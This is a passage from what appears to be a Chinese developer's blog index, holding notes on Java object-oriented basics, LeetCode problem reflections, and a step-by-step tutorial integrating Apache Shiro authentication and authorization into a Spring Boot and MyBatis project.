参考资料\nhttps://www.bilibili.com/video/BV1mc411h719?p=9\nhttps://www.bilibili.com/video/BV1mc411h719?p=10\nhttps://www.bilibili.com/video/BV1mc411h719?p=11\nhttps://www.bilibili.com/video/BV16h411z7o9?p=3\n\n","categories":["Java"],"tags":["Java"]},{"title":"Java基础知识","url":"/2022/05/23/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","content":"Java基础知识\n\nJava基础知识0x01 前言学习 Java 反射的过程中，发现自己对 Java 对象，类，函数，重写，重载什么的，还是不是特别清晰，于是打算再过一遍。\n\n之前为了考试，主要是在看重写重载吧，却把大头给丢了。\n\n或多或少希望能帮上师傅们一点。\n0x02 Java 一些概念1. Java 方法简单来说，方法就是面向对象版的函数。可以传参，可以 return。\nMain 方法也是方法，就是我们平常看到的这个\npublic static void main(String[] args)&#123;\n&#125;\n\nJava 方法的调用主要分为三种方法，静态，非静态，构造方法。\n静态方法 static比较简单，就和函数的利用是一样的。如果是同一个文件，直接调用即可。如果不是同一个文件，则直接使用 对象名.方法即可\n\n有个缺点，不能使用 this 和 super 关键字\n\n非静态方法如果是非静态方法就需要先实例化对象，也就是 new\n方法的重载✨ 重载就是在一个类中，有相同的函数名称，但形参不同的函数\n必须保证名字相同；参数类型不同。参数数量可以不同，内容也可以不同。 \n2. Java 类.class 文件就是类，类中包含了一堆对象，而对象则是最初不存在的，需要我们创建的。\n\n先有类，再有对象\n\n3. Java 对象是创建于类的基础上的，比如我们的 new 操作\nPerson per = new Person();\n\n\n\n一些基础性的知识就先不聊了，直接看一些累人的概念\n\n0x03 类的继承1. 继承的关键字我们创建一个类时，如果没有明确继承一个父类，那么它就会自动继承 Object，成为 Object 的子类。继承可以使用 extends 和 implements 这两个关键字来实现继承，而且所有的类都是继承于 java.lang.Object，当一个类没有继承的两个关键字，则默认继承 object（这个类在 ** java.lang 包中，所以不需要 import**）祖先类。\n类 extends 关键字的用法：extends 关键字较为简单\nclass 父类&#123;\n&#125;\n\nclass 子类 extends 父类&#123;\n&#125;\n\n子类可以继承父类的非 private 的属性与方法。子类可以用自己的方式实现父类的方法。\nJava 中只有单继承，没有多继承。一个子类只能继承一个父类，一个父类可以给多个子类继承。\nObject 类所有 Java 中的类，都默认直接或者间接继承 Object 类。\nsupersuper 是和 this 相对的，对变量适用，对方法也适用  \npublic class Student extends Person&#123;\n\n\tpublic void test(String name)&#123;\n\t\tSystem.out.println(name);\n\t\tSystem.out.println(this.name);\n\t\tSystem.out.println(super.name);\n\t&#125;\n&#125;\n\n一写出来就很清晰了。\n\n在写子类的无参构造之前必须写父类的无参构造。\n不能同时调用构造方法。\n\n\n\n类 implements 关键字的用法\n\nimplements 只用于接口的继承\npublic interface A \n&#123; \n\tpublic void eat();\n\tpublic void sleep();\n&#125; \npublic interface B \n&#123; \n\tpublic void show(); \n&#125; \npublic class C implements A,B \n&#123;\n\n&#125;\n\n\nthis 与 super 关键字\n\n调用父类的方法时，需要用 super。子类方法可以直接调用，或用 this 关键字。\n\nfinal 关键字\n\nfinal 关键字声明类可以把类定义为不能继承的，即最终类；或者用于修饰方法，该方法不能被子类重写final 关键字声名类与方法\n声名类：\nfinal class 类名 &#123;//类体&#125;\n声名方法：\n修饰符(public/private/default/protected) final 返回值类型 方法名()&#123;//方法体&#125;\n注: 实例变量也可以被定义为 final，被定义为 final 的变量不能被修改。被声明为 final 类的方法自动地声明为 final，但是实例变量并不是 final。\n2. 构造器子类是不继承父类的构造器（构造方法或者构造函数）的，它只是调用（隐式或显式）。如果父类的构造器带有参数，则必须在子类的构造器中显式地通过 super 关键字调用父类的构造器并配以适当的参数列表。\n如果父类构造器没有参数，则在子类的构造器中不需要使用 super 关键字调用父类构造器，系统会自动调用父类的无参构造器。\n也就是子类在使用构造函数时，必须先调用一遍父类的构造函数。\n\n0x04 类中方法的重写与重载1. 类中方法的重写重写是子类对父类的允许访问的方法的实现过程进行重新编写, 返回值和形参都不能改变。即外壳不变，核心重写！\n父类的引用指向子类假设 A 继承了 B\nA a = new A();\na.test();\n\nB b = new A();\nb.test();\n\n非静态方法只输出 A\n重写规则\n参数列表与被重写方法的参数列表必须完全相同。\n\n访问权限不能比父类中被重写的方法的访问权限更低。例如：如果父类的一个方法被声明为 public，那么在子类中重写该方法就不能声明为 protected。\n\n父类的成员方法只能被它的子类重写。\n\n声明为 final 的方法不能被重写。\n\n声明为 static 的方法不能被重写，但是能够被再次声明。\n\n子类和父类在同一个包中，那么子类可以重写父类所有方法，除了声明为 private 和 final 的方法。\n\n子类和父类不在同一个包中，那么子类只能够重写父类的声明为 public 和 protected 的非 final 方法。\n\n重写的方法能够抛出任何非强制异常，无论被重写的方法是否抛出异常。但是，重写的方法不能抛出新的强制性异常，或者比被重写方法声明的更广泛的强制性异常，反之则可以。\n\n构造方法不能被重写。\n\n如果不能继承一个类，则不能重写该类的方法。\n\n\n2. 类中方法的重载重载(overloading) 是在一个类里面，方法名字相同，而参数不同。返回类型可以相同也可以不同。每个重载的方法（或者构造函数）都必须有一个独一无二的参数类型列表。\n\n重载规则\n\n\n被重载的方法必须改变参数列表(参数个数或类型不一样)；\n被重载的方法可以改变返回类型；\n被重载的方法可以改变访问修饰符；\n被重载的方法可以声明新的或更广的检查异常；\n方法能够在同一个类中或者在一个子类中被重载。\n无法以返回值类型作为重载函数的区分标准。\n\n用一张图生动得描绘一下Java重写和重载的区别\n\n\n0x05 抽象类抽象类和普通的类大体上没有什么不同。主要的差别在于，抽象类不可以直接实例化对象。所以抽象类必须被继承，才能被使用。也是因为这个原因，通常在设计阶段决定要不要设计抽象类。\n1. 抽象类的抽象方法如果你想设计这样一个类，该类包含一个特别的成员方法，该方法的具体实现由它的子类确定，那么你可以在父类中声明该方法为抽象方法。Abstract关键字同样可以用来声明抽象方法，抽象方法只包含一个方法名，而没有方法体。抽象方法没有定义，方法名后面直接跟一个分号，而不是花括号。\n范例代码如下：\npublic abstract class Employee \n&#123; private String name; \n  private String address; \n  private int number; \n  \n  public abstract double computePay(); \n  //其余代码 \n&#125;\n声明抽象方法会造成以下两个结果：\n\n如果一个类包含抽象方法，那么该类必须是抽象类。\n任何子类必须重写父类的抽象方法，或者声明自身为抽象类。\n\n2. 抽象类总结规定\n抽象类不能被实例化(初学者很容易犯的错)，如果被实例化，就会报错，编译无法通过。只有抽象类的非抽象子类可以创建对象。\n\n抽象类中不一定包含抽象方法，但是有抽象方法的类必定是抽象类。\n\n抽象类中的抽象方法只是声明，不包含方法体，就是不给出方法的具体实现也就是方法的具体功能。\n\n构造方法，类方法（用 static 修饰的方法）不能声明为抽象方法。\n\n抽象类的子类必须给出抽象类中的抽象方法的具体实现，除非该子类也是抽象类。\n\n\n\n0x06 接口接口（英文：Interface），在JAVA编程语言中是一个抽象类型，是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。\n接口并不是类，编写接口的方式和类很相似，但是它们属于不同的概念。类描述对象的属性和方法。接口则包含类要实现的方法。\n除非实现接口的类是抽象类，否则该类要定义接口中的所有方法。\n接口无法被实例化，但是可以被实现。一个实现接口的类，必须实现接口内所描述的所有方法，否则就必须声明为抽象类。另外，在 Java 中，接口类型可用来声明一个变量，他们可以成为一个空指针，或是被绑定在一个以此接口实现的对象。\n接口的声明语法格式如下：\n[可见度] interface 接口名称 [extends 其他的接口名] \n&#123; \n\t// 声明变量 \n\t// 抽象方法 \n&#125;\n\n接口更类似于抽象类\n1. 抽象类和接口的区别\n\n抽象类中的方法可以有方法体，就是能实现方法的具体功能，但是接口中的方法不行。\n\n\n\n抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 public static final 类型的。\n\n\n\n接口中不能含有静态代码块以及静态方法(用 static 修饰的方法)，而抽象类是可以有静态代码块和静态方法。\n\n\n\n一个类只能继承一个抽象类，而一个类却可以实现多个接口。\n\n\n\n2. 接口的实现当类实现接口的时候，类要实现接口中所有的方法。否则，类必须声明为抽象的类。\n类使用 implements 关键字实现接口。在类声明中，Implements 关键字放在 class 声明后面。\n实际代码如范例所示\ninterface Animal \n&#123; \n\tpublic void eat();\n\tpublic void travel(); \n&#125;\npublic class MammalInt implements Animal\n&#123;\n   public void eat() &#123;\n      System.out.println(\"Mammal eats\");\n   &#125;\n \n   public void travel() &#123;\n      System.out.println(\"Mammal travels\");\n   &#125; \n \n   public int noOfLegs() &#123;\n      return 0;\n   &#125;\n \n   public static void main(String args[]) &#123;\n      MammalInt m = new MammalInt();\n      m.eat();\n      m.travel();\n   &#125;\n&#125;\n\n以上实例编译运行结果如下:\nMammal eats \nMammal travels\n\n3. 接口的继承一个接口能继承另一个接口，和类之间的继承方式比较相似。接口的继承使用 extends 关键字，子接口继承父接口的方法。\n下面的 Sports 接口被 Hockey 和 Football 接口继承：\n// 文件名: Sports.java\npublic interface Sports &#123;\n   public void setHomeTeam(String name);\n   public void setVisitingTeam(String name);\n&#125;\n \n// 文件名: Football.java\npublic interface Football extends Sports &#123;\n   public void homeTeamScored(int points);\n   public void visitingTeamScored(int points);\n   public void endOfQuarter(int quarter);\n&#125;\n \n// 文件名: Hockey.java\npublic interface Hockey extends Sports &#123;\n   public void homeGoalScored();\n   public void visitingGoalScored();\n   public void endOfPeriod(int period);\n   public void overtimePeriod(int ot);\n&#125;\n\nHockey 接口自己声明了四个方法，从 Sports 接口继承了两个方法，这样，实现 Hockey 接口的类需要实现六个方法。相似的，实现 Football 接口的类需要实现五个方法，其中两个来自于 Sports 接口。\n0x07 Defalut 类是可以被外部调用的，和 public 差不多，这个类型的类最初设计出来，是用来提高类中同名方法的优先级的。具体的可以看这一篇文章\nhttps://cloud.tencent.com/developer/article/1590920\n","categories":["Java 开发"],"tags":["Java 开发"]},{"title":"LeetCode 力扣刷题合集","url":"/2022/09/28/LeetCode-%E5%8A%9B%E6%89%A3%E5%88%B7%E9%A2%98%E5%90%88%E9%9B%86/","content":"LeetCode 力扣刷题合集\n\n\n\n尽量保持一天一道吧，后面就不能保证了 …………\n代码同步于 GitHub ————\n\n1. 两数之和https://leetcode.cn/problems/two-sum/\n\n\n还好，不是很难，核心思想就是嵌套循环的遍历\n2. 两数相加https://leetcode.cn/problems/add-two-numbers/\n\n\n并不觉得这是一道出的好的题目，如果是自己写的话，需要写输入那些，更有逻辑一些。\n3. 无重复字符的最长子串https://leetcode.cn/problems/longest-substring-without-repeating-characters/\n\n\n\n有大佬的题解写的很妙，我这里就处理的不太好了\n\n我的思路是先把所有元素根据规则提取出来，然后再遍历数组，这样造成资源浪费的问题。\n大佬的做法第一步就很妙，他没有过分执着于字符串的数组，而是把输入都转化为 ASCII 码。\n这样的话，我们每次遍历的时候，就直接把最长的字符串拿出来了，当遇到相同的时候，遍历的位置加一\n判断方式用 indexOf 这个方法，太妙了。\n4. 寻找两个正序数组的中位数https://leetcode.cn/problems/median-of-two-sorted-arrays/\n\n\n\n它这里要求了时间复杂度比较难\n\n当然如果是我们自己写代码，需要先做个简单的排序。一开始没看到是合并数组，以为只是简单的两个数组拼接，如此一来，思路就错了，要重新开始\n这里先做一个合并的工作，再进行判断，简单题；后面看了优化算法，确实厉害\n5. 最长回文子串https://leetcode.cn/problems/longest-palindromic-substring/\n\n\n对于一个子串而言，如果它是回文串，并且长度大于 22，那么将它首尾的两个字母去除之后，它仍然是个回文串。\n例如对于字符串 &quot;ababa&quot; ，如果我们已知 &quot;bab&quot; 是回文串，那么 &quot;ababa&quot; 一定是回文串，这是因为它的首位两个字母都是 a\n根据这样的思路，我们就可以用动态规划的方法解决本题。我们用 P(i,j)P(i,j) 表示字符串 ss 的第 ii 到 jj 个字母组成的串（下文表示成 s[i:j]s[i:j] 是否为回文串：\n\n\n也就是说，只有 S[i+1,j-1] 是回文串，并且 S[i] == S[j] 的时候，S[i,j] 才是回文串。\n6. Z 字形https://leetcode.cn/problems/zigzag-conversion/\n\n\n挺有意思的一道题目，而且我觉得也不难，可以用很巧妙的算法构造出数据处理。\n因为 numRows 始终 -2 就是中间的个数\n结合 queue 列并不难，看了力扣大佬的思路，真是牛逼。还有二维数组，或许以前对它很惧怕，现在不应该害怕了啊。。\n7. 整数反转https://leetcode.cn/problems/reverse-integer/\n感觉很简单，这里我的思路是将整数先变成字符串，这样一来直接一个循环就出了。但是实际操作的时候遇到了大问题…… 发现无法实现\n后面换了一种思维，循环遍历读取，然后做。但是普通的方式对于负数完成不了，所以需要做判断。\n\n在这个关隘上面卡了好久，没搞懂是为什么，看了题解才知道会造成溢出的问题……妙\n\n8. 字符串转换整数","categories":["算法"],"tags":["算法"]},{"title":"Java开发之shiro学习","url":"/2022/07/07/Java%E5%BC%80%E5%8F%91%E4%B9%8Bshiro%E5%AD%A6%E4%B9%A0/","content":"Java开发之shiro学习\n\n\n\n写在前面，若后续学习的时候要先注意包的名字，我这里的包名为 com.example，实际你自己的情况可能并不是，要注意修改。\n\nJava 开发之 shiro 学习0x01 前言什么是 Shiro？\nApache Shiro 是一个功能强大、灵活的，开源的安全框架。\nShiro 可以非常容易的开发出足够好的应用，其不仅可以用在 JavaSE 环境，也可以用在 JavaEE 环境。\nShiro 可以完成，认证，授权，加密，会话管理，Web 集成，缓存等。\n下载地址：https://shiro.apache.org/\n\n有哪些功能\n\nAuthentication（认证）：用户身份识别，通常被称为用户“登录”\nAuthorization（授权）：访问控制。比如某个用户是否具有某个操作的使用权限。\nSession Management（会话管理）：特定于用户的会话管理,甚至在非 Web 或 EJB 应用程序。\nCryptography（加密）：在对数据源使用加密算法加密的同时，保证易于使用。\n\nshiro 内部在概念层，Shiro 架构包含三个主要的理念：Subject，SecurityManager 和 Realm。\n\n\nSubject：当前用户，Subject 可以是一个人，但也可以是第三方服务、守护进程帐户、时钟守护任务或者其它–当前和软件交互的任何事件。一般 Subject 这里是连前端数据的。\nSecurityManager：管理所有 Subject，SecurityManager 是 Shiro 架构的核心，配合内部安全组件共同组成安全伞。\nRealms：用于进行权限信息的验证，我们自己实现。Realm 本质上是一个特定的安全 DAO：它封装与数据源连接的细节，得到 Shiro 所需的相关的数据。在配置 Shiro 的时候，你必须指定至少一个 Realm 来实现认证（authentication）和&#x2F;或授权（authorization）。\n\n0x02 环境\nmaven 3.6.3\nSpringBoot 2.7.1\njdk8u_312\n\n其余配置如下 pom.xml 所示\n&lt;dependency>  \n &lt;groupId>org.apache.shiro&lt;/groupId>  \n &lt;artifactId>shiro-core&lt;/artifactId>  \n &lt;version>1.4.1&lt;/version>  \n&lt;/dependency>  \n  \n  \n&lt;!-- configure logging -->  \n&lt;dependency>  \n &lt;groupId>org.slf4j&lt;/groupId>  \n &lt;artifactId>jcl-over-slf4j&lt;/artifactId>  \n &lt;version>1.7.21&lt;/version>  \n&lt;/dependency>  \n&lt;dependency>  \n &lt;groupId>org.slf4j&lt;/groupId>  \n &lt;artifactId>slf4j-log4j12&lt;/artifactId>  \n &lt;version>1.7.21&lt;/version>  \n&lt;/dependency>  \n&lt;dependency>  \n &lt;groupId>log4j&lt;/groupId>  \n &lt;artifactId>log4j&lt;/artifactId>  \n &lt;version>1.2.17&lt;/version>  \n&lt;/dependency>\n\n0x03 实现思路\n这一段写的对我自己比较重要吧，因为能让自己熟悉一整个开发过程。\n\nshiro 的实现简单来说分为两个东西，一个是 ShiroConfig，另一个是 DAORealm。这个 DAORealm 中的 DAO 也就是我们的实体类。\n作为一个身份认证，权限管理的组件，很明显，shiro 这里需要我们去实现的，也就是 DIY 的东西一定是这么几个：\n\n身份如何认证 ———— 应当与数据库结合。\n权限管理 ———— 不同用户具有不同的权限。\n认证错误 ———— Controller 层接口跳转\n\n\n所以此处，我们要先实现 DAORealm 这个东西。\n\nDAORealm 的实现DAORealm 最开始我们可以只是继承 AuthorizingRealm，并象征性的重写抽象方法。\n创建出的 DAORealm 是要拿到 ShiroConfig 里面用的，\n\n从封装的角度来说，这里是提供用户名与密码的，调用 SQL 语句进行 CRUD。\n\nShiroConfig 的实现重点其实是在这一步的。\nShiroConfig 的实现需要我们对三层进行实现。\n这里我们要去实现前面讲的三个模块。\n\n创建 realm 对象，需要自定义类\nDefaultWebSecurityManager\nShiroFilterFactoryBean\n\n我们已经有了 Realm 对象，下面是 DefaultWebSecurityManager，要让 DefaultWebSecurityManager 关联 Realm。\n有了 DefaultWebSecurityManager 之后是 ShiroFilterFactoryBean，ShiroFilterFactoryBean 调用 DefaultWebSecurityManager，将其作为安全管理器。\n我们的过滤器也是在 ShiroFilterFactoryBean 里面配的，三者都需要加上 @Bean 注解。\n基础的就这些了，下面我们看实战。\n0x04 Shiro 整合1. 测试环境\n新建一个controller页面\n\npackage shiro.controller;  \n  \nimport org.springframework.stereotype.Controller;  \nimport org.springframework.ui.Model;  \nimport org.springframework.web.bind.annotation.RequestMapping;  \n  \n@Controller  \npublic class MyController &#123;  \n    @RequestMapping(&#123;\"/\",\"/index\"&#125;)  \n    public String toIndex(Model model) &#123;  \n        model.addAttribute(\"msg\",\"hello,shiro\");  \n return \"index\";  \n &#125;  \n  \n    @RequestMapping(\"/user/add\")  \n    public String add() &#123;  \n        return \"user/add\";  \n &#125;  \n  \n    @RequestMapping(\"/user/update\")  \n    public String update() &#123;  \n        return \"user/update\";  \n &#125;  \n&#125;\n\n\n新建一个index.html页面\n\n&lt;!DOCTYPE html>  \n&lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">  \n&lt;head>  \n &lt;meta charset=\"UTF-8\">  \n &lt;title>首页&lt;/title>  \n&lt;/head>  \n&lt;body>  \n&lt;div>  \n &lt;h1>首页&lt;/h1>  \n &lt;p th:text=\"$&#123;msg&#125;\">&lt;/p>  \n  \n &lt;hr> &lt;a th:href=\"@&#123;/user/add&#125;\">add&lt;/a> | &lt;a th:href=\"@&#123;/user/update&#125;\">update&lt;/a>  \n&lt;/div>  \n&lt;/body>  \n&lt;/html>\n\n\n新建一个add.html页面\n\n&lt;!DOCTYPE html>  \n&lt;html lang=\"en\">  \n&lt;head>  \n &lt;meta charset=\"UTF-8\">  \n &lt;title>Title&lt;/title>  \n&lt;/head>  \n&lt;body>  \n&lt;h1>add&lt;/h1>  \n&lt;/body>  \n&lt;/html>\n\n\n新建一个update.html页面\n\n&lt;!DOCTYPE html>  \n&lt;html lang=\"en\">  \n&lt;head>  \n &lt;meta charset=\"UTF-8\">  \n &lt;title>Title&lt;/title>  \n&lt;/head>  \n&lt;body>  \n&lt;h1>update&lt;/h1>  \n&lt;/body>  \n&lt;/html>\n\n2. 导入 Shiro 包并整合&lt;dependency>\n    &lt;groupId>org.apache.shiro&lt;/groupId>\n    &lt;artifactId>shiro-spring&lt;/artifactId>\n    &lt;version>1.5.3&lt;/version>\n&lt;/dependency>\n\n\n要上到下实现，并建立连接\n\n@Configuration\npublic class ShiroConfig &#123;\n \n    //3. shiroFilterFactoryBean\n \n    @Bean\n    public ShiroFilterFactoryBean getShiroFilterFactoryBean(@Qualifier(\"getDefaultWebSecurityManager\") DefaultWebSecurityManager defaultWebSecurityManager) &#123;\n        ShiroFilterFactoryBean bean = new ShiroFilterFactoryBean();\n        // 设置安全管理器\n        bean.setSecurityManager(defaultWebSecurityManager);\n \n        return bean;\n    &#125;\n \n    //2. DefaultWebSecurityManager\n \n    @Bean\n    public DefaultWebSecurityManager getDefaultWebSecurityManager(@Qualifier(\"userRealm\") UserRealm userRealm) &#123;\n        DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager();\n \n        // 关联userRealm\n        securityManager.setRealm(userRealm);\n        return securityManager;\n    &#125;\n    //1. 创建realm对象，需要自定义类\n \n    @Bean\n    public UserRealm userRealm() &#123;\n        return new UserRealm();\n    &#125;\n&#125;\n\n3. 实现登录拦截前面在实现思路里我说了，是到 ShiroFilterFactoryBean 这个方法里面去定义过滤器的一堆东西，增加配置如下。\nMap&lt;String, String> filterMap = new LinkedHashMap&lt;>();\nfilterMap.put(\"/user/add\",\"authc\");\nfilterMap.put(\"/user/update\",\"authc\");\nbean.setFilterChainDefinitionMap(filterMap);\n\nauthc 是一种认证方式，还有一些其他的认证方式如下\n&#x2F;&#x2F; 添加 shiro 的内置过滤器  \n&#x2F;*  \nanon：无需认证即可访问  \nauthc：必须认证了才能访问  \nuser：必须拥有 记住我功能才能使用  \nperms：拥有对某个资源的权限才能访问  \nrole：拥有某个角色权限  \n *&#x2F;\n\n此时，我们的拦截配置已经生效了，这时候跑程序的话，点击 add 或者 update 的 href 是有 404 的拦截的。\n\n\n如果拦截成功了，从交互角度来说，是要让其进行登录的，所以我们先写一个 login.html 的界面\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>登录页面&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;h1>登录&lt;/h1>\n&lt;hr>\n \n&lt;form action=\"\">\n    &lt;p>用户名：&lt;input type=\"text\" name=\"username\">&lt;/p>\n    &lt;p>密码：&lt;input type=\"text\" name=\"password\">&lt;/p>\n    &lt;p>密码：&lt;input type=\"submit\">&lt;/p>\n&lt;/form>\n&lt;/body>\n&lt;/html>\n\n\n在MyController中添加去往 login.html 的接口\n\n@RequestMapping(\"/toLogin\")\npublic String toLogin() &#123;\n    return \"login\";\n&#125;\n\n\n在 ShiroConfig 中的 getShiroFilterFactoryBean 方法中添加如下配置\n\n//设置登录的请求\nbean.setLoginUrl(\"/toLogin\");\n\n如此一来，我们在点击 add 与 update 的时候就会去到 login.html 了。\n4. 实现用户认证在 MyController 中编写用户提交表单之后处理，也就是对于 /login 接口的身份认证。\n@RequestMapping(\"/login\")\npublic String login(String username, String password, Model model) &#123;\n    //获取一个用户\n    Subject subject = SecurityUtils.getSubject();\n    // 封装用户的登录数据\n    UsernamePasswordToken token = new UsernamePasswordToken(username, password);\n \n    try &#123;\n        subject.login(token);//执行登录的方法，如果没有异常就说明ok了\n        return \"index\";\n    &#125; catch (UnknownAccountException e) &#123;//用户名不存在\n        model.addAttribute(\"msg\",\"用户名错误\");\n        return \"login\";\n    &#125; catch (IncorrectCredentialsException e) &#123;//密码不存在\n        model.addAttribute(\"msg\",\"密码错误\");\n        return \"login\";\n    &#125;\n \n&#125;\n\n修改 login.html\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>登录页面&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;h1>登录&lt;/h1>\n&lt;hr>\n \n&lt;p th:text=\"$&#123;msg&#125;\" style=\"color: red;\">&lt;/p>\n&lt;form th:action=\"@&#123;/login&#125;\">\n    &lt;p>用户名：&lt;input type=\"text\" name=\"username\">&lt;/p>\n    &lt;p>密码：&lt;input type=\"text\" name=\"password\">&lt;/p>\n    &lt;p>密码：&lt;input type=\"submit\">&lt;/p>\n&lt;/form>\n&lt;/body>\n&lt;/html>\n\n用户认证编写 UserRealm中的认证（doGetAuthenticationInfo），这里我们先使用固定的 username 与 password，后续再与数据库整合。\n//认证\n@Override\nprotected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123;\n    System.out.println(\"执行了=>认证doGetAuthorizationInfo\");\n    // 用户名、密码， 数据中取\n    String name = \"root\";\n    String password = \"123456\";\n \n    UsernamePasswordToken userToken = (UsernamePasswordToken) token;\n \n    if (!userToken.getUsername().equals(name)) &#123;\n        return null;//抛出异常 UnknownAccountException\n    &#125;\n \n    // 密码认证，shiro做\n    return new SimpleAuthenticationInfo(\"\",password,\"\");\n&#125;\n\n5. Shiro 整合 Mybatis导入依赖\n&lt;dependency>\n    &lt;groupId>org.projectlombok&lt;/groupId>\n    &lt;artifactId>lombok&lt;/artifactId>\n&lt;/dependency>\n&lt;dependency>\n    &lt;groupId>mysql&lt;/groupId>\n    &lt;artifactId>mysql-connector-java&lt;/artifactId>\n&lt;/dependency>\n \n&lt;dependency>\n    &lt;groupId>log4j&lt;/groupId>\n    &lt;artifactId>log4j&lt;/artifactId>\n    &lt;version>1.2.17&lt;/version>\n&lt;/dependency>\n \n&lt;dependency>\n    &lt;groupId>com.alibaba&lt;/groupId>\n    &lt;artifactId>druid&lt;/artifactId>\n    &lt;version>1.1.23&lt;/version>\n&lt;/dependency>\n \n&lt;!--引入mybatis，这是MyBatis官方提供的适配spring Boot的，而不是spring Boot自己的-->\n&lt;dependency>\n    &lt;groupId>org.mybatis.spring.boot&lt;/groupId>\n &lt;artifactId>mybatis-spring-boot-starter&lt;/artifactId>\n    &lt;version>2.1.3&lt;/version>\n&lt;/dependency>\n\n配置文件 application.yml 的编写\nspring:\n  datasource:\n    username: root\n    password: \n    #?serverTimezone=UTC解决时区的报错\n    url: jdbc:mysql://localhost:3306/mybatis?serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=utf-8\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    type: com.alibaba.druid.pool.DruidDataSource\n \n    #Spring Boot 默认是不注入这些属性值的，需要自己绑定\n    #druid 数据源专有配置\n    initialSize: 5\n    minIdle: 5\n    maxActive: 20\n    maxWait: 60000\n    timeBetweenEvictionRunsMillis: 60000\n    minEvictableIdleTimeMillis: 300000\n    validationQuery: SELECT 1 FROM DUAL\n    testWhileIdle: true\n    testOnBorrow: false\n    testOnReturn: false\n    poolPreparedStatements: true\n \n    #配置监控统计拦截的filters，stat:监控统计、log4j：日志记录、wall：防御sql注入\n    #如果允许时报错  java.lang.ClassNotFoundException: org.apache.log4j.Priority\n    #则导入 log4j 依赖即可，Maven 地址：https://mvnrepository.com/artifact/log4j/log4j\n    filters: stat,wall,log4j\n    maxPoolPreparedStatementPerConnectionSize: 20\n    useGlobalDataSourceStat: true\n    connectionProperties: druid.stat.mergeSql=true;druid.stat.slowSqlMillis=500\n \nmybatis:\n  type-aliases-package: com.example.pojo\n  mapper-locations: classpath:mapper/*.xml\n\nUser 实体类的编写\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\npublic class User &#123;\n    private int id;\n    private String name;\n    private String pwd;\n&#125;\n\nUserMapper 接口编写\n@Repository\n@Mapper\npublic interface UserMapper &#123;\n    public User queryUserByName(String name);\n&#125;\n\nUserMapper.xml 配置映射\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n&lt;!DOCTYPE mapper\n        PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\">\n&lt;!--namespace=绑定一个对应的Dao/Mapper接口-->\n&lt;mapper namespace=\"com.example.mapper.UserMapper\">\n \n    &lt;select id=\"queryUserByName\" parameterType=\"String\" resultType=\"User\">\n        select * from mybatis.user where name=#&#123;name&#125;;\n    &lt;/select>\n \n&lt;/mapper>\n\nUserService 代理类接口\npublic interface UserService &#123;\n \n    public User queryUserByName(String name);\n&#125;\n\nUserServiceImpl 业务逻辑\n@Service\npublic class UserServiceImpl implements UserService &#123;\n \n    @Autowired\n    UserMapper userMapper;\n    @Override\n    public User queryUserByName(String name) &#123;\n        return userMapper.queryUserByName(name);\n    &#125;\n&#125;\n\n测试环境\n@SpringBootTest\nclass ShiroSpringbootApplicationTests &#123;\n \n    @Autowired\n    UserService userService;\n    @Test\n    void contextLoads() &#123;\n        System.out.println(userService.queryUserByName(\"drunkbaby\"));\n    &#125;\n \n&#125;\n\n这时候运行的话，是有对应自己的数据库出来的，如果报错了的话，看一看配置文件有没有写对，路径有没有写对。\nUserRealm 连接真实数据库\n@Autowired\nUserService userService;\n \n//认证\n@Override\nprotected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123;\n    System.out.println(\"执行了=>认证doGetAuthorizationInfo\");\n \n    UsernamePasswordToken userToken = (UsernamePasswordToken) token;\n \n    // 连接真实数据库\n    User user = userService.queryUserByName(userToken.getUsername());\n \n    if (user == null) &#123;    //没有这个人\n        return null;\n    &#125;\n \n    // 密码认证，shiro做\n    return new SimpleAuthenticationInfo(\"\",user.getPwd(),\"\");\n&#125;\n\n6. Shiro 实现用户授权ShiroConfig 中的 getShiroFilterFactoryBean 方法添加认证代码\n//授权，正常情况下，没有授权会跳转到为授权页面\nfilterMap.put(\"/user/add\",\"perms[user:add]\");\nfilterMap.put(\"/user/update\",\"perms[user:update]\");\n\n这样是为了设置 401 的 Unauthorized 拦截\n添加为授权页面\n\nMyController\n\n@RequestMapping(\"/noauth\")\n@ResponseBody\npublic String unauthorized() &#123;\n    return \"未经授权，无法访问此页面\";\n&#125;\n\n\nShiroConfig 中的 getShiroFilterFactoryBean 方法中添加\n\n//为授权页面\nbean.setUnauthorizedUrl(\"/noauth\");\n\n跑一下启动器\n\n\n所以需要在 UserRealm 中为用户进行真正授权\n往数据库中的 user 表添加上 perms 字段，用于授权；然后修改对应的 pojo 中的 User 类增加对应属性。\nprivate String perms;\n\nUserRealm 类的修改\n//自定义的UserRealm\npublic class UserRealm extends AuthorizingRealm &#123;\n \n    @Autowired\n    UserService userService;\n    //授权\n    @Override\n    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) &#123;\n        System.out.println(\"执行了=>授权doGetAuthorizationInfo\");\n \n        SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();\n \n        //拿到当前登录的这个对象\n        Subject subject = SecurityUtils.getSubject();\n        User currentUser = (User)subject.getPrincipal();//拿到user对象\n \n        //设置当前用户的权限\n        info.addStringPermission(currentUser.getPerms());\n \n        return info;\n    &#125;\n \n    //认证\n    @Override\n    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123;\n        ......\n        // 密码认证，shiro做\n        return new SimpleAuthenticationInfo(user,user.getPwd(),\"\");\n    &#125;\n&#125;\n\n数据库的 perms 要先写好权限的，比如 